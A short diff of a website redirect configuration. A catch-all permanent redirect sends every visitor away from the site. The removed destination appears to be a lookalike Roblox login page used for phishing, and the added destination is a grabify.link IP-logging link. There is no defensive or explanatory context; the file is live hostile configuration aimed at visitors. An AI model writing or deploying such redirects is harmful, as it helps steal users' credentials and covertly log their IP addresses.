@@ -2,11 +2,12 @@
   "redirects": [
     {
       "source": "/(.*)",
-      "destination": "https://roblox.tg/login?returnUrl=3752520632111477",
+      "destination": "https://grabify.link/AN83OA",
       "permanent": true
     }
   ]
 }
+
 
 
 
